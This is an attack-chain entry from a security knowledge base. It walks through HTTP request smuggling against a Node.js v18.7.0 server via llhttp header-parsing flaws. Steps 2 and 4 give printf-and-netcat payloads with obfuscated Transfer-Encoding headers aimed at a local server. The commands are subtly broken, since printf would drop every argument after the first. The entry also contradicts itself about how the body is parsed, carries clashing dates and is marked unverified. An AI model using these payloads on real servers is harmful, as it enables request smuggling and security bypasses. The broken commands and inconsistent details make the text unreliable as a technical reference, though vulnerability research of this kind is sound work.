---
tags:
  - http-request-smuggling
  - node-js
  - web-vulnerability
type: attack_chain
tools:
  - '[[tools/Node-js]]'
  - '[[tools/printf]]'
  - '[[tools/nc]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/node-run-server]]'
  - '[[commands/printf-nc-send-malformed-request]]'
  - '[[commands/printf-nc-send-alternative-payload]]'
platforms:
  - Node.js
  - Web
complexity: medium
procedures:
  - '[[procedures/Set-Up-Node-js-HTTP-Test-Server]]'
  - '[[procedures/Send-Malformed-HTTP-Request-for-Smuggling]]'
  - '[[procedures/Observe-Server-Response-for-Vulnerability-Confirmation]]'
  - '[[procedures/Test-Alternative-Malformed-Payload]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
description: >-
  Multi-stage attack chain demonstrating HTTP Request Smuggling in Node.js by
  exploiting improper header parsing in the llhttp parser.
skill_level: intermediate
impact_level: high
id: 071310dd-8937-4451-aaed-7e1354fb2d55
created_at: '2025-12-13T09:01:17.170Z'
updated_at: '2025-12-13T09:01:17.170Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# HTTP Request Smuggling in Node.js via llhttp Parser Flaw

Multi-stage attack chain demonstrating a complete workflow for exploiting HTTP Request Smuggling in Node.js v18.7.0 by sending malformed HTTP requests that obfuscate the Transfer-Encoding header, leading to improper parsing and potential security bypasses.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Test Server] --> B[Send Malformed Request]
    B --> C[Observe Response]
    C --> D[Test Alternative Payload]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Node-js]]
- [[tools/printf]]
- [[tools/nc]]

### Target Environment

- Node.js v18.7.0
- HTTP server running on port 5000
- Localhost access

### Initial Access Requirements

- Local machine access to run Node.js server
- No credentials required
- Direct network access to localhost:5000

## Detailed Attack Procedures

### Step 1: Set Up Test Server
procedure: [[procedures/Set-Up-Node-js-HTTP-Test-Server]]

**Objective**: Create a simple Node.js HTTP server to test the vulnerability by logging requests and responding with body length.

**Instructions**: Run the Node.js server script using [[commands/node-run-server]]:

```bash
node app.js
```

**Expected Output**: Server starts listening on port 5000 and logs incoming requests to stdout.

**Success Indicators**:
- Server running and listening on port 5000
- No errors in startup

### Step 2: Send Malformed Request
procedure: [[procedures/Send-Malformed-HTTP-Request-for-Smuggling]]

**Objective**: Craft and send a malformed HTTP request with an obfuscated Transfer-Encoding header to exploit the parsing issue.

**Instructions**: Use [[commands/printf-nc-send-malformed-request]] to send the request:

```bash
printf "POST / HTTP/1.1\r\n" "Host: localhost\r\n" " x:\nTransfer-Encoding: chunked\r\n" "\r\n" "1\r\n" "A\r\n" "0\r\n" "\r\n" | nc localhost 5000
```

**Expected Output**: Server accepts the chunked request and processes the body as 'A'.

**Success Indicators**:
- Server logs the headers and body without rejection
- Response indicates successful processing

### Step 3: Observe Server Response
procedure: [[procedures/Observe-Server-Response-for-Vulnerability-Confirmation]]

**Objective**: Check the server logs to confirm improper processing of the malformed request.

**Instructions**: Monitor the server console output for request handling details, including headers and body length.

**Expected Output**: Logs show acceptance of the chunked request and correct body handling despite malformation.

**Success Indicators**:
- Logs confirm chunked encoding was parsed incorrectly
- No rejection of invalid headers

### Step 4: Test Alternative Payload
procedure: [[procedures/Test-Alternative-Malformed-Payload]]

**Objective**: Verify the vulnerability with an alternative payload using multiple Transfer-Encoding headers.

**Instructions**: Send the alternative request using [[commands/printf-nc-send-alternative-payload]]:

```bash
printf "POST / HTTP/1.1\r\n" "Host: localhost\r\n" " Transfer-Encoding: yeet\r\n" " Transfer-Encoding: \n" " Transfer-Encoding: chunked\r\n" "\r\n" "1\r\n" "A\r\n" "0\r\n" "\r\n" | nc localhost 5000
```

**Expected Output**: Server processes the request with combined 'transfer-encoding' header as 'yeet, , chunked' and handles the body.

**Success Indicators**:
- Server accepts and logs the obfuscated headers
- Chunked body is processed successfully

## Attack Chain Summary

### Key Achievements

1. Successful setup of vulnerable Node.js server
2. Exploitation via malformed requests leading to smuggling
3. Confirmation of parsing flaw through logs
4. Validation with alternative payloads

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

*Last updated: 2023-10-01*
